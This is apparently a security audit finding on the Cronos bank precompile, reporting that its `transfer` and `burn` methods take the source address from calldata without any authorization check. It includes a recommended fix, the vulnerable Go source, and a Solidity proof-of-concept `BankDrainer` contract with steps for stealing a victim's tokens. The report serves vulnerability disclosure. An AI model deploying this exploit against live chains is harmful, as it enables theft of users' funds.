### Title
Unauthorized Native Token Transfer via Unauthenticated `sender` Argument in Bank Precompile `transfer` Method - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The bank precompile's `transfer` method accepts an arbitrary `sender` address from calldata and executes a native token transfer from that address without verifying that the caller has any authorization to spend from it. Any contract can drain `evm/<callerContract>` native tokens from any victim address that holds them.

### Finding Description
In `BankContract.Run`, the `TransferMethodName` case unpacks `sender` directly from ABI-encoded calldata and uses it as the `from` address in `bankKeeper.SendCoins`. The denom is derived from `contract.Caller()` (the calling contract's address), but the source account for the transfer is the caller-supplied `sender` argument — with no check that `sender == contract.Caller()` or that the caller holds any approval from `sender`.

```go
// x/cronos/keeper/precompiles/bank.go L175-192
sender := args[0].(common.Address)   // arbitrary, from calldata
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // evm/<callerContract>
...
if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [1](#0-0) 

The only guards present are a `readonly` flag, a positive-amount check, a blocked-address check on `to`, and a send-enabled check — none of which verify that the caller is authorized to spend from `sender`. [2](#0-1) 

The same pattern applies to the `burn` case: `addr` (the address to burn from) is taken from calldata with no check that `addr == contract.Caller()`. [3](#0-2) 

### Impact Explanation
An unprivileged attacker deploys a malicious contract M and calls the bank precompile with `transfer(victimAddress, attackerAddress, victimBalance)`. This executes `bankKeeper.SendCoins(victim, attacker, evm/M-coins)` — an unauthorized transfer of precompile-controlled native assets from the victim to the attacker. Any address holding `evm/M` tokens (e.g., users who previously called `bank.mint` through M, or received tokens via IBC auto-conversion into M's denom) can be drained without consent.

This matches the Critical impact class: **unauthorized transfer of precompile-controlled assets**.

### Likelihood Explanation
The attacker only needs to deploy a contract and call the bank precompile — no special privileges, keys, or governance access required. The bank precompile is a live, registered precompile at address `0x0000000000000000000000000000000000000064`. [4](#0-3) 

The `IBankModule` interface is publicly documented and callable from any Solidity contract. [5](#0-4) 

### Recommendation
In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

Similarly, in the `BurnMethodName` case, enforce that `recipient` (the address being burned from) equals `contract.Caller()`. This ensures a contract can only move tokens it itself holds, matching the intended design shown in `TestBank.sol` where `bank.transfer(msg.sender, ...)` is always called with the contract's own user context. [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
}

contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Attacker calls this to drain victim's evm/<address(this)> tokens
    function drain(address victim, address attacker, uint256 amount) external {
        // No authorization check in the precompile — succeeds unconditionally
        // if victim holds evm/<address(this)> tokens
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `BankDrainer` at address M.
2. Victim accumulates `evm/M` tokens (e.g., via `bank.mint(victim, amount)` called through M as part of a service, or via IBC auto-conversion if M's denom is mapped).
3. Attacker calls `BankDrainer.drain(victimAddress, attackerAddress, victimBalance)`.
4. `bankKeeper.SendCoins(victim, attacker, evm/M-coins)` executes — victim's balance is zeroed, attacker receives the tokens — with no signature or approval from the victim. [2](#0-1)

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
